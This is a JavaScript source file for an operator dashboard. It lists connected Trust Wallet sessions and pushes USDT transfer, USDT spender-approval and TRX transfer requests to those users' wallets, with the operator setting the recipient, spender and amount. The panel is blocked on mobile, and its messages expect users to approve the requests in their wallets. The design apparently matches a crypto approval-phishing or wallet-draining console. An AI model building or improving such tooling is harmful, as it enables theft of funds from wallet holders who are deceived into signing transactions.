const STORAGE_API = "tw_tron_admin_api";
const STORAGE_SECRET = "tw_tron_admin_secret";

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_DECIMALS = 6;

const el = {
  mobileBlock: document.getElementById("mobileBlock"),
  apiBase: document.getElementById("apiBase"),
  adminSecret: document.getElementById("adminSecret"),
  connectBtn: document.getElementById("connectBtn"),
  refreshBtn: document.getElementById("refreshBtn"),
  status: document.getElementById("status"),
  walletRows: document.getElementById("walletRows"),
  requestRows: document.getElementById("requestRows"),
  walletSelect: document.getElementById("walletSelect"),
  requestForm: document.getElementById("requestForm"),
  requestType: document.getElementById("requestType"),
  transferFields: document.getElementById("transferFields"),
  approveFields: document.getElementById("approveFields"),
  trxFields: document.getElementById("trxFields"),
  recipientAddress: document.getElementById("recipientAddress"),
  spenderAddress: document.getElementById("spenderAddress"),
  trxRecipientAddress: document.getElementById("trxRecipientAddress"),
  amountValue: document.getElementById("amountValue"),
  requestNote: document.getElementById("requestNote"),
  eventsBox: document.getElementById("eventsBox"),
};

const state = {
  apiBase: "",
  adminSecret: "",
  wallets: [],
  requests: [],
  events: [],
  ws: null,
  connected: false,
};

function isMobile() {
  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || "");
}

function setStatus(text) {
  el.status.textContent = text;
}

function trimSlash(value) {
  return String(value || "").replace(/\/+$/, "");
}

function normalizeBase(raw) {
  let value = trimSlash(raw).trim();
  if (!value) return "";

  if (!/^https?:\/\//i.test(value)) {
    value = `${location.protocol === "https:" ? "https" : "http"}://${value}`;
  }

  if (location.protocol === "https:" && value.startsWith("http://")) {
    value = `https://${value.slice(7).replace(/:8787(?=\/|$)/, "")}`;
  }

  return trimSlash(value);
}

function fmtDate(iso) {
  if (!iso) return "-";
  const parsed = new Date(iso);
  return Number.isNaN(parsed.getTime()) ? iso : parsed.toLocaleString();
}

function short(value, max = 22) {
  if (!value) return "-";
  return value.length <= max ? value : `${value.slice(0, max - 3)}...`;
}

function syncRequestTypeFields() {
  const type = el.requestType.value;
  el.transferFields.hidden = type !== "trc20_transfer";
  el.approveFields.hidden = type !== "trc20_approve";
  el.trxFields.hidden = type !== "send_trx";
}

async function aFetch(path, opts = {}) {
  if (!state.apiBase || !state.adminSecret) {
    throw new Error("Connect admin first");
  }

  const response = await fetch(`${state.apiBase}${path}`, {
    ...opts,
    headers: {
      "Content-Type": "application/json",
      "x-admin-secret": state.adminSecret,
      ...(opts.headers || {}),
    },
  });

  if (!response.ok) {
    throw new Error((await response.text()) || `HTTP ${response.status}`);
  }

  return response.json();
}

function renderWallets() {
  if (!state.wallets.length) {
    el.walletRows.innerHTML =
      '<tr><td colspan="4" class="empty-cell">No wallets connected yet.</td></tr>';
    el.walletSelect.innerHTML = '<option value="">- No wallets -</option>';
    return;
  }

  el.walletRows.innerHTML = state.wallets
    .map(
      (wallet) => `
        <tr>
          <td class="mono">${short(wallet.clientId, 18)}</td>
          <td class="mono">${wallet.address}</td>
          <td><span class="pill ${wallet.connected ? "pill-on" : "pill-off"}">${wallet.connected ? "Online" : "Offline"}</span></td>
          <td>${fmtDate(wallet.lastSeen)}</td>
        </tr>
      `,
    )
    .join("");

  el.walletSelect.innerHTML = state.wallets
    .map(
      (wallet) => `
        <option value="${wallet.clientId}">
          ${short(wallet.address, 28)} - ${wallet.connected ? "Online" : "Offline"}
        </option>
      `,
    )
    .join("");
}

function typeLabel(type) {
  if (type === "trc20_transfer") return "Send USDT";
  if (type === "trc20_approve") return "Approve Spender";
  if (type === "send_trx") return "Send TRX";
  return type;
}

function requestAmountLabel(request) {
  if (request.type === "send_trx") {
    return `${request.params?.amount ?? "-"} TRX`;
  }
  if (request.type === "trc20_transfer" || request.type === "trc20_approve") {
    return `${request.params?.amount ?? "-"} USDT`;
  }
  return request.params?.amount ?? "-";
}

function renderRequests() {
  if (!state.requests.length) {
    el.requestRows.innerHTML =
      '<tr><td colspan="7" class="empty-cell">No requests yet.</td></tr>';
    return;
  }

  el.requestRows.innerHTML = state.requests
    .map(
      (request) => `
        <tr>
          <td>${fmtDate(request.createdAt)}</td>
          <td>${typeLabel(request.type)}</td>
          <td><strong>${requestAmountLabel(request)}</strong></td>
          <td class="mono">${short(request.address, 18)}</td>
          <td><span class="pill pill-${request.status}">${request.status}</span></td>
          <td class="mono">${
            request.txid
              ? `<a href="https://tronscan.org/#/transaction/${request.txid}" target="_blank" rel="noreferrer">${short(request.txid, 16)}</a>`
              : "-"
          }</td>
          <td>${request.note || "-"}</td>
        </tr>
      `,
    )
    .join("");
}

function renderEvents() {
  if (!state.events.length) {
    el.eventsBox.textContent = "No events yet.";
    return;
  }

  el.eventsBox.textContent = state.events
    .slice(0, 30)
    .map((event) => `[${fmtDate(event.timestamp)}] ${event.type} ${JSON.stringify(event.payload)}`)
    .join("\n");
}

function applySnapshot(snapshot) {
  state.wallets = snapshot.wallets || [];
  state.requests = snapshot.requests || [];
  state.events = snapshot.events || [];
  renderWallets();
  renderRequests();
  renderEvents();
}

function wsUrl(base) {
  if (base.startsWith("https://")) return `wss://${base.slice(8)}/ws`;
  if (base.startsWith("http://")) return `ws://${base.slice(7)}/ws`;
  return `ws://${base}/ws`;
}

function connectWs() {
  if (state.ws && (state.ws.readyState === WebSocket.OPEN || state.ws.readyState === WebSocket.CONNECTING)) {
    return;
  }

  state.ws = new WebSocket(wsUrl(state.apiBase));

  state.ws.onopen = () => {
    state.ws.send(
      JSON.stringify({
        type: "identify",
        role: "admin",
        secret: state.adminSecret,
      }),
    );
    setStatus("Admin connected");
  };

  state.ws.onmessage = (event) => {
    let payload;
    try {
      payload = JSON.parse(event.data);
    } catch {
      return;
    }

    if (payload.type === "admin_snapshot" && payload.data) {
      applySnapshot(payload.data);
      return;
    }

    if (payload.type === "error") {
      setStatus(`WS error: ${payload.message}`);
    }
  };

  state.ws.onclose = () => {
    setStatus("WebSocket disconnected. Refresh to reconnect.");
  };
}

async function loadSnapshot() {
  applySnapshot(await aFetch("/api/admin/snapshot"));
}

async function connectAdmin() {
  state.apiBase = normalizeBase(el.apiBase.value);
  state.adminSecret = el.adminSecret.value.trim();

  if (!state.apiBase || !state.adminSecret) {
    setStatus("API base and admin secret required");
    return;
  }

  localStorage.setItem(STORAGE_API, state.apiBase);
  localStorage.setItem(STORAGE_SECRET, state.adminSecret);

  setStatus("Connecting...");

  try {
    await loadSnapshot();
    connectWs();
    state.connected = true;
    setStatus("Admin connected");
  } catch (error) {
    state.connected = false;
    setStatus(`Connect failed: ${error}`);
  }
}

function validPositiveAmount(value) {
  const numeric = Number(value);
  return Number.isFinite(numeric) && numeric > 0;
}

function buildPayload() {
  const clientId = el.walletSelect.value.trim();
  const type = el.requestType.value;
  const note = el.requestNote.value.trim();
  const amount = el.amountValue.value.trim();

  if (!clientId) throw new Error("Select a wallet session");
  if (!validPositiveAmount(amount)) throw new Error("Enter a valid amount greater than 0");

  if (type === "trc20_transfer") {
    const to = el.recipientAddress.value.trim();
    if (!to) throw new Error("Enter a recipient address for the transfer request");
    return {
      clientId,
      type,
      note,
      params: {
        token: USDT_CONTRACT,
        to,
        amount,
        decimals: USDT_DECIMALS,
      },
    };
  }

  if (type === "trc20_approve") {
    const spender = el.spenderAddress.value.trim();
    if (!spender) throw new Error("Enter a spender address for the approve request");
    return {
      clientId,
      type,
      note,
      params: {
        token: USDT_CONTRACT,
        spender,
        amount,
        decimals: USDT_DECIMALS,
      },
    };
  }

  if (type === "send_trx") {
    const to = el.trxRecipientAddress.value.trim();
    if (!to) throw new Error("Enter a recipient address for the TRX request");
    return {
      clientId,
      type,
      note,
      params: {
        to,
        amount,
      },
    };
  }

  throw new Error("Unknown request type");
}

async function submitRequest(event) {
  event.preventDefault();
  if (!state.connected) {
    setStatus("Connect admin first");
    return;
  }

  try {
    const payload = buildPayload();
    const result = await aFetch("/api/admin/requests", {
      method: "POST",
      body: JSON.stringify(payload),
    });

    if (result.delivered) {
      setStatus("Request sent. User can approve it in Trust Wallet now.");
    } else {
      setStatus("Request saved. User will receive it when they reconnect.");
    }

    el.amountValue.value = "";
    el.requestNote.value = "";
    el.recipientAddress.value = "";
    el.spenderAddress.value = "";
    el.trxRecipientAddress.value = "";
    await loadSnapshot();
  } catch (error) {
    setStatus(`Request failed: ${error}`);
  }
}

function initDesktopGuard() {
  if (isMobile()) {
    el.mobileBlock.hidden = false;
    el.connectBtn.disabled = true;
    el.refreshBtn.disabled = true;
    setStatus("Blocked on mobile");
  }
}

function hydrate() {
  const defaultBase = ["localhost", "127.0.0.1"].includes(location.hostname)
    ? `${location.protocol}//${location.hostname}:8787`
    : location.origin;

  el.apiBase.value = normalizeBase(localStorage.getItem(STORAGE_API) || defaultBase);
  el.adminSecret.value = localStorage.getItem(STORAGE_SECRET) || "";
}

el.requestType.addEventListener("change", syncRequestTypeFields);
el.connectBtn.addEventListener("click", connectAdmin);
el.refreshBtn.addEventListener("click", async () => {
  if (!state.connected) {
    setStatus("Connect first");
    return;
  }

  try {
    await loadSnapshot();
    setStatus("Refreshed");
  } catch (error) {
    setStatus(`Refresh failed: ${error}`);
  }
});
el.requestForm.addEventListener("submit", submitRequest);

hydrate();
initDesktopGuard();
syncRequestTypeFields();
